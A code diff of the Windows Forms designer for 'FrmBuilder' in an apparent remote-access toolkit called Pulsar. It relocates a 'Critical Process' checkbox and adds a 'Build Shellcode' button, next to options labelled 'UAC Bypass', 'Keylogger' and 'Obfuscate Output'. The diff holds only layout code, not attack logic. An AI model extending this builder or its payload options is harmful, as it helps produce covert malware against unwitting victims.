@@ -55,6 +55,7 @@ namespace Pulsar.Server.Forms
             this.clearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderTabs = new Pulsar.Server.Controls.DotNetBarTabControl();
             this.generalPage = new System.Windows.Forms.TabPage();
+            this.chkCriticalProcess = new System.Windows.Forms.CheckBox();
             this.chkUACBypass = new System.Windows.Forms.CheckBox();
             this.chkPackOutput = new System.Windows.Forms.CheckBox();
             this.chkObfuscateOutput = new System.Windows.Forms.CheckBox();
@@ -145,7 +146,7 @@ namespace Pulsar.Server.Forms
             this.line10 = new Pulsar.Server.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
-            this.chkCriticalProcess = new System.Windows.Forms.CheckBox();
+            this.btnShellcode = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.contextMenuStrip.SuspendLayout();
@@ -291,6 +292,17 @@ namespace Pulsar.Server.Forms
             this.generalPage.Size = new System.Drawing.Size(391, 376);
             this.generalPage.TabIndex = 4;
             this.generalPage.Text = "Basic Settings";
+            // 
+            // chkCriticalProcess
+            // 
+            this.chkCriticalProcess.AutoSize = true;
+            this.chkCriticalProcess.Location = new System.Drawing.Point(271, 224);
+            this.chkCriticalProcess.Name = "chkCriticalProcess";
+            this.chkCriticalProcess.Size = new System.Drawing.Size(102, 17);
+            this.chkCriticalProcess.TabIndex = 29;
+            this.chkCriticalProcess.Text = "Critical Process";
+            this.chkCriticalProcess.UseVisualStyleBackColor = true;
+            this.chkCriticalProcess.CheckedChanged += new System.EventHandler(this.chkCriticalProcess_CheckedChanged);
             // 
             // chkUACBypass
             // 
@@ -1234,16 +1246,15 @@ namespace Pulsar.Server.Forms
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.chkKeylogger_CheckedChanged);
             // 
-            // chkCriticalProcess
+            // btnShellcode
             // 
-            this.chkCriticalProcess.AutoSize = true;
-            this.chkCriticalProcess.Location = new System.Drawing.Point(271, 224);
-            this.chkCriticalProcess.Name = "chkCriticalProcess";
-            this.chkCriticalProcess.Size = new System.Drawing.Size(102, 17);
-            this.chkCriticalProcess.TabIndex = 29;
-            this.chkCriticalProcess.Text = "Critical Process";
-            this.chkCriticalProcess.UseVisualStyleBackColor = true;
-            this.chkCriticalProcess.CheckedChanged += new System.EventHandler(this.chkCriticalProcess_CheckedChanged);
+            this.btnShellcode.Location = new System.Drawing.Point(275, 389);
+            this.btnShellcode.Name = "btnShellcode";
+            this.btnShellcode.Size = new System.Drawing.Size(121, 23);
+            this.btnShellcode.TabIndex = 2;
+            this.btnShellcode.Text = "Build Shellcode";
+            this.btnShellcode.UseVisualStyleBackColor = true;
+            this.btnShellcode.Click += new System.EventHandler(this.btnShellcode_Click);
             // 
             // FrmBuilder
             // 
@@ -1251,6 +1262,7 @@ namespace Pulsar.Server.Forms
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
             this.BackColor = System.Drawing.SystemColors.Control;
             this.ClientSize = new System.Drawing.Size(535, 424);
+            this.Controls.Add(this.btnShellcode);
             this.Controls.Add(this.builderTabs);
             this.Controls.Add(this.btnBuild);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -1387,5 +1399,6 @@ namespace Pulsar.Server.Forms
         private System.Windows.Forms.CheckBox chkPackOutput;
         private System.Windows.Forms.CheckBox chkUACBypass;
         private System.Windows.Forms.CheckBox chkCriticalProcess;
+        private System.Windows.Forms.Button btnShellcode;
     }
 }
